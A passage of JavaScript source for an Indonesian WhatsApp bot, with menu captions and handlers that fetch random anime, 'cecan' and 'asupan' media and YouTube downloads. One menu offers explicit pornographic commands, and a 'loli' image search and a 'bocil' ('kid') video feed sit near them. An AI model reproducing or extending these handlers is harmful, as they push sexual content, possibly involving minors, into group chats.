╭✄┈┈┈⟬ *Mᴇɴᴜ Tᴇʀʟᴀʀᴀɴɢ* ⟭
┆❐ ${prefix}ahegao
┆❐ ${prefix}ass
┆❐ ${prefix}bdsm
┆❐ ${prefix}porno
┆❐ ${prefix}blowjob
┆❐ ${prefix}ukold
┆❐ ${prefix}um
┆❐ ${prefix}femdom
┆❐ ${prefix}foot
┆❐ ${prefix}gangbang
┆❐ ${prefix}gifs
┆❐ ${prefix}glasses
┆❐ ${prefix}hentai
┆❐ ${prefix}manga
┆❐ ${prefix}masturbation
┆❐ ${prefix}megumin
┆❐ ${prefix}cuddle
┆❐ ${prefix}foxgirl
┆❐ ${prefix}kemonomimi2
┆❐ ${prefix}woof
┆❐ ${prefix}holo2
┆❐ ${prefix}hug
┆❐ ${prefix}kiss
┆❐ ${prefix}lizard
┆❐ ${prefix}meowi
┆❐ ${prefix}neko2
┆❐ ${prefix}pat
┆❐ ${prefix}poke
┆❐ ${prefix}slap
┆❐ ${prefix}tickle
┆❐ ${prefix}neko
┆❐ ${prefix}nekop
┆❐ ${prefix}nekonime
┆❐ ${prefix}orgy
┆❐ ${prefix}panties
┆❐ ${prefix}tentacles
┆❐ ${prefix}thighs
┆❐ ${prefix}zettai
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'muslimmenu': 
       case 'menumuslim': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Mᴜsʟɪᴍ Mᴇɴᴜ* ⟭
┆❐ ${prefix}asmaulhusna
┆❐ ${prefix}kisahnabi
┆❐ ${prefix}jadwalshalat
┆❐ ${prefix}randomquran
┆❐ ${prefix}randomquran2
┆❐ ${prefix}dictator
┆❐ ${prefix}listsurah
┆❐ ${prefix}tafsirsurah
┆❐ ${prefix}alquranaudio
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'cecanmenu': 
       case 'menucecan': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Cᴇᴄᴀɴ Mᴇɴᴜ* ⟭
┆❐ ${prefix}cecan
┆❐ ${prefix}cecan2
┆❐ ${prefix}china
┆❐ ${prefix}cogan
┆❐ ${prefix}indonesia
┆❐ ${prefix}japan
┆❐ ${prefix}korea
┆❐ ${prefix}malaysia
┆❐ ${prefix}thailand
┆❐ ${prefix}vietnam
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'menusticker':
       case 'stikermenu':
       case 'menustiker':
       case 'stickermenu': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Sᴛɪᴄᴋᴇʀ Mᴇɴᴜ* ⟭
┆❐ ${prefix}qc ⟨ Quick Chat Versi Stiker ⟩
┆❐ ${prefix}emoji ⟨ Opsi Emoji ⟩
┆❐ ${prefix}sticker
┆❐ ${prefix}emojimix
┆❐ ${prefix}emojimix2
┆❐ ${prefix}ipmoji ⟨ Emoji iPhone ⟩
┆❐ ${prefix}gomoji ⟨ Emoji Google ⟩
┆❐ ${prefix}sammoji ⟨ Emoji Samsung ⟩
┆❐ ${prefix}micmoji ⟨ Emoji Microsoft ⟩
┆❐ ${prefix}wamoji ⟨ Emoji WhatsApp ⟩
┆❐ ${prefix}twitmoji ⟨ Emoji Twitter ⟩
┆❐ ${prefix}skmoji ⟨ Emoji Skype ⟩
┆❐ ${prefix}fbmoji ⟨ Emoji Facebook ⟩
┆❐ ${prefix}joymoji ⟨ Emoji Joy ⟩
┆❐ ${prefix}mojimoji ⟨ Emoji Moji ⟩
┆❐ ${prefix}pedmoji ⟨ Emoji Pedia ⟩
┆❐ ${prefix}igmoji ⟨ Emoji Instagram ⟩
┆❐ ${prefix}htcmoji ⟨ Emoji HTC ⟩
┆❐ ${prefix}mozmoji ⟨ Emoji Mozilla ⟩
┆❐ ${prefix}softmoji ⟨ Emoji SoftBank ⟩
┆❐ ${prefix}docmoji ⟨ Emoji Docomo ⟩
┆❐ ${prefix}kddmoji ⟨ Emoji KDDI ⟩
┆❐ ${prefix}smeme
┆❐ ${prefix}stickerpin ⟨ Stiker Pinterest ⟩
┆❐ ${prefix}sgif
┆❐ ${prefix}amongus
┆❐ ${prefix}chat
┆❐ ${prefix}attp ⟨ Dengan GIF ⟩
┆❐ ${prefix}ttp ⟨ Tanpa GIF ⟩
┆❐ ${prefix}anime
┆❐ ${prefix}animegif
┆❐ ${prefix}sbucin
┆❐ ${prefix}rabbit
┆❐ ${prefix}dadu
┆❐ ${prefix}pentol
┆❐ ${prefix}gura
┆❐ ${prefix}mukalu
┆❐ ${prefix}patrickgif
┆❐ ${prefix}paimon
┆❐ ${prefix}random
┆❐ ${prefix}patrick
┆❐ ${prefix}popoci
┆❐ ${prefix}sponsbob
┆❐ ${prefix}kawan-sponsbob
┆❐ ${prefix}awoawo
┆❐ ${prefix}hat
┆❐ ${prefix}benedict
┆❐ ${prefix}dbfly
┆❐ ${prefix}dino-kuning
┆❐ ${prefix}doge
┆❐ ${prefix}gojosatoru
┆❐ ${prefix}hope-boy
┆❐ ${prefix}jisoo
┆❐ ${prefix}kr-robot
┆❐ ${prefix}lonte
┆❐ ${prefix}manusia-lidi
┆❐ ${prefix}menjamet
┆❐ ${prefix}meow
┆❐ ${prefix}nicholas
┆❐ ${prefix}tyni
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
       case 'menugroup':
       case 'menugrup': 
       case 'grupmenu': 
       case 'groupmenu': {
      if (isBan) return reply(mess.ban)
   tganz.sendMessage(from, { react: { text: "⏱️", key: m.key }})
tganz.sendMessage(m.chat, {
                    image: pp_bot,
                    caption: 
`════════════════════⊙
⫹⫺ Hᴀɪ ᴋᴀᴋ ${pushname} 🙌🏻
⫹⫺ *${sayyingTime}*
════════════════════⊙
⫹⫺ Mᴏᴅᴇ Bᴏᴛ : ${db.data.settings[botNumber].modebot23 ? '*Semua Orang 👥*' : `*Hanya Owner 👤*`}
════════════════════⊙
${readmore}
╭✄┈┈┈⟬ *Gʀᴏᴜᴘ Mᴇɴᴜ* ⟭
┆❐ ${prefix}autoai ⟨ Pengetahuan ⟩ - ⟨ ON/OFF ⟩
┆❐ ${prefix}autosimi ⟨ Penghiburan ⟩ - ⟨ ON/OFF ⟩
┆❐ ${prefix}autostiker ⟨ Pembuatan ⟩ - ⟨ ON/OFF ⟩
┆❐ ${prefix}naik ⟨ Naik Jabatan ⟩ - ⟨ Tag/Balas Pesannya ⟩
┆❐ ${prefix}turun ⟨ Turun Jabatan ⟩ - ⟨ Tag/Balas Pesannya ⟩
┆❐ ${prefix}setppgc ⟨ Ubah Foto Profil Grup ⟩
┆❐ ${prefix}setnama ⟨ Ubah Nama Grup ⟩
┆❐ ${prefix}setdesk ⟨ Ubah Deskripsi Grup ⟩
┆❐ ${prefix}editinfo ⟨ Akses Edit Info Grup ⟩
┆❐ ${prefix}carigrup
┆❐ ${prefix}inspect
┆❐ ${prefix}afk ⟨ Istirahat/Offline ⟩
┆❐ ${prefix}opentime ⟨ Buka Otomatis ⟩
┆❐ ${prefix}closetime ⟨ Tutup Otomatis ⟩
┆❐ ${prefix}listonline
┆❐ ${prefix}infochat
┆❐ ${prefix}gcbot ⟨ Grup Bot TestGanz ⟩
┆❐ ${prefix}vote ⟨ Melakukan Vote Grup ⟩
┆❐ ${prefix}devote
┆❐ ${prefix}upvote
┆❐ ${prefix}cekvote
┆❐ ${prefix}hapusvote ⟨ Hapus Hasil Vote ⟩
┆❐ ${prefix}linkgc
┆❐ ${prefix}reslink ⟨ buat linkgc baru ⟩
┆❐ ${prefix}mute ⟨ Heningkan Grup ⟩
┆❐ ${prefix}add ⟨ Masukan Nomornya ⟩
┆❐ ${prefix}kick ⟨ Tag/Balas Pesanannya ⟩
┆❐ ${prefix}grup ⟨ Klik Tutup/Buka ⟩
┆❐ ${prefix}buka
┆❐ ${prefix}tutup
┆❐ ${prefix}wpesan ⟨ Pesan Sementara ⟩
┆❐ ${prefix}tagme ⟨  Tag Diri Sendiri ⟩
┆❐ ${prefix}tagall ⟨  Tag Semua Member ⟩
┆❐ ${prefix}hidetag ⟨ Tag Tersembunyi ⟩
┆❐ ${prefix}welcome ⟨ Sambutan Selanat Datang ⟩
┆❐ ${prefix}goodbye ⟨ Sambutan Selamat Tinggal ⟩
┆❐ ${prefix}antiwame ⟨ Pencegah Link wa-me ⟩
┆❐ ${prefix}antilinkyt ⟨ Pencegah Link YouTube ⟩
┆❐ ${prefix}antilinkchannel ⟨ Pencegah Link Channel ⟩
┆❐ ${prefix}antilinkall ⟨ Pencegah Semua Link - Medsos ⟩
┆❐ ${prefix}antilink ⟨ Pencegah Link Grup ⟩
┆❐ ${prefix}antilinktwt ⟨ Pencegah Link Twitter ⟩
┆❐ ${prefix}antilinktt ⟨ Pencegah Link TikTok ⟩
┆❐ ${prefix}antilinktg ⟨ Pencegah Link Telegram ⟩
┆❐ ${prefix}antilinkfb ⟨ Pencegah Link Facebook ⟩
┆❐ ${prefix}antilinkig ⟨ Pencegah Link Instagram ⟩
┆❐ ${prefix}antivirtex ⟨ Pencegah Virtex ⟩
┆❐ ${prefix}antipromosi ⟨ Pencegah Promosi Panel ⟩
╰────────────◇`
      })
   const devsound = fs.readFileSync('./Media/yamete.mp3')
  tganz.sendMessage(m.chat, { audio: devsound, mimetype: 'audio/mp4', ptt: true, quoted: m })
    }
       break
            //anime
            case 'akira':
            case 'akiyama':
            case 'ana':
            case 'asuna':
            case 'ayuzawa':
            case 'boruto':
            case 'chitoge':
            case 'deidara':
            case 'doraemon':
            case 'elaina':
            case 'emilia':
            case 'erza':
            case 'gremory':
            case 'hestia':
            case 'hinata':
            case 'inori':
            case 'isuzu':
            case 'itachi':
            case 'itori':
            case 'kaga':
            case 'kagura':
            case 'kakasih':
            case 'kaori':
            case 'keneki':
            case 'kotori':
            case 'kurumi':
            case 'madara':
            case 'mikasa':
            case 'miku':
            case 'minato':
            case 'naruto':
            case 'nezuko':
            case 'onepiece':
            case 'pokemon':
            case 'rize':
            case 'sagiri':
            case 'sakura':
            case 'sasuke':
            case 'shina':
            case 'shinka':
            case 'shizuka':
            case 'shota':
            case 'toukachan':
            case 'tsunade':
            case 'yuki': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Random%20Anime/${command}.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                tganz.sendFile(m.chat, result, `${command}.jpg`, `❑ Aɴɪᴍᴇ : *${command}*`, m)
            }    
            break
         case 'loli': {
         if (isBan) return reply(mess.ban)
          m.reply(mess.wait)
            tganz.sendMessage(m.chat, { image: { url : `https://api.lolhuman.xyz/api/gimage?apikey=${lolkeysapi}&query=loli chan` }, caption: `❑ Aɴɪᴍᴇ : *${command}*`}, { quoted: m } )
           }
            break
         // Asupan
         case 'asupan': {
         if (isBan) return reply(mess.ban)
m.reply(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./storage/asupan/asupan.json'))
var hasil = pickRandom(asupan)
tganz.sendFile(m.chat, hasil.url, `${command}.mp4`, mess.done, m)
}
   break
case 'wallpp': 
case 'isoa': 
case 'wallp': 
case 'wallpaper': {
         if (isBan) return reply(mess.ban)
          if (!text) return reply(`Mᴀᴜ ᴄᴀʀɪ ᴡᴀʟʟᴘᴀᴘᴇʀ ᴀᴘᴀ ᴋᴀᴋ ?\n*❑ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : ${prefix + command} Mɪɴᴀᴛᴏ*`)
              m.reply(mess.wait)
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `.isoa ${text}`, buttonText: {displayText: 'LANJUT ⌲'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `⌈ *Hᴀsɪʟ Pᴇɴᴄᴀʀɪᴀɴ* ⌋\n⭔ *❑ Jᴜᴅᴜʟ :* ⟨ ${text} ⟩\n⭔ *❑ Kᴀᴛᴇɢᴏʀɪ :* ${result.type}\n⭔ *❑ Dᴇᴛᴀɪʟ :* ${result.source}\n⭔ *❑ Lɪɴᴋ Gᴀᴍʙᴀʀ :* ${result.image[2] || result.image[1] || result.image[0]}\n\n⌘ ᴋʟɪᴋ ʟᴀɴᴊᴜᴛ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀʀɪ ᴡᴀʟʟᴘᴀᴘᴇʀ ⟨ *${text}* ⟩`,
                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
                tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
case 'asupanghea':
case 'hea': {
if (isBan) return reply(mess.ban)
m.reply(mess.wait)
var gheayubi = JSON.parse(fs.readFileSync('./storage/asupan/gheayubi.json'))
var hasil = pickRandom(gheayubi)
tganz.sendFile(m.chat, hasil.url, `${command}.mp4`, mess.done, m)
}
break
case 'bocil': 
case 'asupanbocil': {
if (isBan) return reply(mess.ban)
m.reply(mess.wait)
var bocil = JSON.parse(fs.readFileSync('./storage/asupan/bocil.json'))
var hasil = pickRandom(bocil)
tganz.sendFile(m.chat, hasil.url, `${command}.mp4`, mess.done, m)
}
break
case 'asupanukhty': 
case 'ukhty': {
if (isBan) return reply(mess.ban)
m.reply(mess.wait)
var ukhty = JSON.parse(fs.readFileSync('./storage/asupan/ukhty.json'))
var hasil = pickRandom(ukhty)
tganz.sendFile(m.chat, hasil.url, `${command}.mp4`, mess.done, m)
}
break
case 'asupansantuy':
case 'santuy':  {
if (isBan) return reply(mess.ban)
m.reply(mess.wait)
var santuy = JSON.parse(fs.readFileSync('./storage/asupan/santuy.json'))
var hasil = pickRandom(santuy)
tganz.sendFile(m.chat, hasil.url, `${command}.mp4`, mess.done, m)
}
break
case 'asupankayes': 
case 'kayes': {
if (isBan) return reply(mess.ban)
m.reply(mess.wait)
var kayes = JSON.parse(fs.readFileSync('./storage/asupan/kayes.json'))
var hasil = pickRandom(kayes)
tganz.sendFile(m.chat, hasil.url, `${command}.mp4`, mess.done, m)
}
break
case 'asupanrika':
case 'rika':  {
if (isBan) return reply(mess.ban)
m.reply(mess.wait)
var rikagusriani = JSON.parse(fs.readFileSync('./storage/asupan/rikagusriani.json'))
var hasil = pickRandom(rikagusriani)
tganz.sendFile(m.chat, hasil.url, `${command}.mp4`, mess.done, m)
}
break
case 'asupannotnot': 
case 'notnot': {
if (isBan) return reply(mess.ban)
m.reply(mess.wait)
var notnot = JSON.parse(fs.readFileSync('./storage/asupan/asupannotnot.json'))
var hasil = pickRandom(notnot)
tganz.sendFile(m.chat, hasil.url, `${command}.mp4`, mess.done, m)
}
break
          case 'geayubi': {
            if (isBan) return reply(mess.ban)
          reply(mess.wait)
         let res = await fetch(`https://raw.githubusercontent.com/binjaicity/warga62/master/${command}.json`)
  //if (!res.ok) return await res.json()
         let asup = await res.json()
         let json = asup[Math.floor(Math.random() * asup.length)]
  //if (!json.url) return 'Error!'
          tganz.sendFile(m.chat, json.url, `${command}.mp4`, mess.done, m)
         }
          break
            case 'chika':
            case 'delvira':
            case 'ayu':
            case 'bunga':
            case 'aura':
            case 'nisa':
            case 'ziva':
            case 'yana':
            case 'viona':
            case 'syania':
            case 'riri':
            case 'syifa':
            case 'mama-gina':
            case 'alcakenya':
            case 'mangayutri': {
            if (isBan) return reply(mess.ban)
                reply(mess.wait)
                let res = await fetch(global.api('alfa', '/api/asupan/' + command, {}, 'apikey'))
                if (!res.ok) throw await res.text()
                let img = await res.buffer()
                tganz.sendFile(m.chat, img, `${command}.mp4`, mess.done, m)
            }
            break
            //cecan
            case 'cewekcantik':
            case 'cewecantik':
            case 'cecan': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/cecan.json`)
                result = anu[Math.floor(Math.random() * anu.length)]     
                tganz.sendFile(m.chat, result, `${command}.jpg`, `❑ Cᴇᴄᴀɴ : *Cecan*`, m)
            }
            break
            case 'cecan2': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/cecan2.json`)
                result = anu[Math.floor(Math.random() * anu.length)]              
                tganz.sendFile(m.chat, result, `${command}.jpg`, `❑ Cᴇᴄᴀɴ : *Cᴀᴍᴘᴜʀᴀɴ*`, m)
            } 
            break
            case 'chinese':
            case 'china': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/china.json`)
                result = anu[Math.floor(Math.random() * anu.length)]           
                tganz.sendFile(m.chat, result, `${command}.jpg`, `❑ Cᴇᴄᴀɴ : *China*`, m)
            }     
            break
            case 'indonesia': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/indonesia.json`)
                result = anu[Math.floor(Math.random() * anu.length)]            
                tganz.sendFile(m.chat, result, `${command}.jpg`, `❑ Cᴇᴄᴀɴ : *Indoensia*`, m)
            }    
            break
            case 'jepang':
            case 'japan': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/japan.json`)
                result = anu[Math.floor(Math.random() * anu.length)]              
                tganz.sendFile(m.chat, result, `${command}.jpg`, `❑ Cᴇᴄᴀɴ : *Jepang*`, m)
            }  
            break
            case 'korean':
            case 'korea': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/korea.json`)
                result = anu[Math.floor(Math.random() * anu.length)]              
                tganz.sendFile(m.chat, result, `${command}.jpg`, `❑ Cᴇᴄᴀɴ : *Korea*`, m)
            }  
            break
            case 'malaysia': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/malaysia.json`)
                result = anu[Math.floor(Math.random() * anu.length)]            
                tganz.sendFile(m.chat, result, `${command}.jpg`, `❑ Cᴇᴄᴀɴ : *Malaysia*`, m)
            }    
            break
            case 'tailand':
            case 'thailand': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/thailand.json`)
                result = anu[Math.floor(Math.random() * anu.length)]            
                tganz.sendFile(m.chat, result, `${command}.jpg`, `❑ Cᴇᴄᴀɴ : *Thailand*`, m)
            }  
            break
            case 'vietnam': {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/vietnam.json`)
                result = anu[Math.floor(Math.random() * anu.length)]            
                tganz.sendFile(m.chat, result, `${command}.jpg`, `❑ Cᴇᴄᴀɴ : *Vietnam*`, m)
            } 
            break
            //cogan
            case 'cowokganteng':
            case 'cowoganteng':
            case "cogan": {
            if (isBan) return reply(mess.ban)
                m.reply(mess.wait)
                let anu = await fetchJson(`https://raw.githubusercontent.com/Abuzzpoet/Databasee/main/Cecan/cogan.json`)
                result = anu[Math.floor(Math.random() * anu.length)]               
                tganz.sendFile(m.chat, result, `${command}.jpg`, `❑ Cᴇᴄᴀɴ : *Cogan*`, m)
            }    
            break
            //download
            case 'yta':
            case 'ytmp3':
            case 'playmp3':
            case 'mp3': {
            if (isBan) return reply(mess.ban)
            if (!q) return reply(`Kɪʀɪᴍ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Lɪɴᴋɴʏᴀ !\n\n◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n*${prefix+command} https://youtu.be/zYcyrT8ARCU*`)
            if (!isUrl(args[0])) return reply(`Kɪʀɪᴍ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Lɪɴᴋɴʏᴀ !\n\n◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n*${prefix+command} https://youtu.be/zYcyrT8ARCU*`)
            if (!args[0].includes('youtu.be') && !args[0].includes('youtube.com')) return reply(`Kɪʀɪᴍ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Lɪɴᴋɴʏᴀ !\n\n◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n*${prefix+command} https://youtu.be/zYcyrT8ARCU*`)
            reply(mess.wait)
            let asly = await fetchJson(`https://yt.nxr.my.id/yt2?url=${q}&type=audio`)
tganz.sendMessage(m.chat, { audio: { url: asly.data.url }, mimetype: 'audio/mpeg', fileName: `${asly.title}.mp3`, ptt: true }, { quoted: m })
      }
            break  
            case 'ytv':
            case 'ytmp4':
            case 'playmp4':
            case 'mp4': {
            if (isBan) return reply(mess.ban)
           if (!q) return reply(`Kɪʀɪᴍ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Lɪɴᴋɴʏᴀ !\n\n◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n*${prefix+command} https://youtu.be/zYcyrT8ARCU*`)
            if (!isUrl(args[0])) return reply(`Kɪʀɪᴍ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Lɪɴᴋɴʏᴀ !\n\n◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n*${prefix+command} https://youtu.be/zYcyrT8ARCU*`)
            if (!args[0].includes('youtu.be') && !args[0].includes('youtube.com')) return reply(`Kɪʀɪᴍ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} Lɪɴᴋɴʏᴀ !\n\n◈ Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ :\n*${prefix+command} https://youtu.be/zYcyrT8ARCU*`)
            reply(mess.wait)
           let asly = await fetchJson(`https://yt.nxr.my.id/yt2?url=${q}&type=video`)
         tganz.sendMessage(m.chat, { video: {url : asly.data.url}, mimetype: 'video/mp4', fileName: `${asly.title}.mp4`, caption: `*⫹⫺ YᴏᴜTᴜʙᴇ - Vɪᴅᴇᴏ*
⊙══════════════════⊙
 *❑  Jᴜᴅᴜʟ :* ${asly.title}
 *❑  Dᴜʀᴀsɪ :* ${asly.duration}
 *❑  Cʜᴀɴɴᴇʟ :* ${asly.channel}
 *❑  Jᴜᴍʟᴀʜ Pᴇɴᴏɴᴛᴏɴ :* ${asly.views}
 *❑  Uᴋᴜʀᴀɴ Fɪʟᴇ :* ${asly.data.size}
 *❑  Kᴜᴀʟɪᴛᴀs :* ${asly.data.quality}
 ⊙══════════════════⊙` }, { quoted: m })
      }
           break  
            case 'playy':
            case 'play': {
            if (isBan) return reply(mess.ban)
                if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} judul lagu\n\nContoh penggunaan:\n${prefix+command} Lagu Surat cinta untuk starla`)
                //if (isUrl(text)) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} judul lagu\n\nContoh penggunaan:\n${prefix+command} Lagu Surat cinta untuk starla`)
                reply(mess.wait)
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `.ytmp3 ${anu.url}`, buttonText: {displayText: '🎧 Audio'}, type: 1},
                    {buttonId: `.ytmp4 ${anu.url}`, buttonText: {displayText: 'Video 🎦'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
    「 *INFO SEARCH* 」
                    
  Mᴇᴛᴏᴅᴇ : Pᴇɴᴄᴀʀɪᴀɴ Mᴏᴅᴇʀɴ
  ID : ${anu.videoId}
  Jᴜᴅᴜʟ : ${anu.title}
  Pᴇɴᴄɪᴘᴛᴀ : ${anu.author.name}
  Cʜᴀɴɴᴇʟ : ${anu.author.url}
  Dᴜʀᴀsɪ : ${anu.timestamp}
  Pᴇɴᴏɴᴛᴏɴ : ${anu.views}
  Uᴘʟᴏᴀᴅ Pᴀᴅᴀ : ${anu.ago}
  Lɪɴᴋ Vɪᴅᴇᴏ : ${anu.url}
  
  Dᴇsᴋʀɪᴘsɪ : ${anu.description}`,

                    footer: footer_text,
                    buttons: buttons,
                    headerType: 4
                }
        tganz.sendMessage(m.chat, buttonMessage, { quoted: m })
         }
            break
            case 'yts':
            case 'ytsearch': {
            if (isBan) return reply(mess.ban)
            if (!text) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} judul lagu/video\n\nContoh penggunaan:\n${prefix+command} Lagu Surat Cinta Untuk Starla`)
                //if (isUrl(text)) return reply(`Kᴇᴛɪᴋ Pᴇʀɪɴᴛᴀʜ :\n${prefix+command} judul lagu/video\n\nContoh penggunaan:\n${prefix+command} Lagu Surat cinta untuk starla`)
                reply(mess.wait)
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = '                      *⟨ PENCARIAN YOUTUBE ⟩*\n\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n   *◈ Hᴀsɪʟ Pᴇɴᴄᴀʀɪᴀɴ* : '+text+'\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += ` *══════════⟨ ${no++} ⟩══════════*\n⭔ *Tɪᴘᴇ* : ${i.type}\n⭔ *ID* : ${i.videoId}\n⭔ *Jᴜᴅᴜʟ* : ${i.title}\n⭔ *Pᴇɴᴏɴᴛᴏɴ* : ${i.views}\n⭔ *Dᴜʀᴀsɪ* : ${i.timestamp}\n⭔ *Uᴘʟᴏᴀᴅ Pᴀᴅᴀ* : ${i.ago}\n⭔ *Pᴇɴᴄɪᴘᴛᴀ* : ${i.author.name}\n⭔ *Lɪɴᴋ* : ${i.url}\n *═════════════════════⊙*\n\n`
                }
                tganz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
         }
            break
            case 'emoji': {
         if (isBan) return reply(mess.ban)
            	if (!text) return reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
			if (!q) return m.reply(`Eᴍᴏᴊɪɴʏᴀ ᴍᴀɴᴀ ᴋᴀᴋ ?\n\n*Cᴏɴᴛᴏʜ : ${prefix + command} 😏*`)
			let sections = [
                {
	           title: '❑ Pilih jenis emoji di bawah ini :',
	           rows: [
	            {title: "Iphone", rowId: `.iphoneemoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji Iphone`},
                {title: "Google", rowId: `.googleemoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji Google`},
                {title: "Samsung", rowId: `.samsungemoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji Samsung`},
                {title: "Microsoft", rowId: `.microsoftemoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji Microsoft`},
                {title: "Whatsapp", rowId: `.whatsappemoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji WhatsApp`},
                {title: "Twitter", rowId: `.twitteremoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji Twitter`},
                {title: "Facebook", rowId: `.facebookemoji ${text}`, description: `Mengubah Emoji Biasa Menjadi Emoji Facebook`},
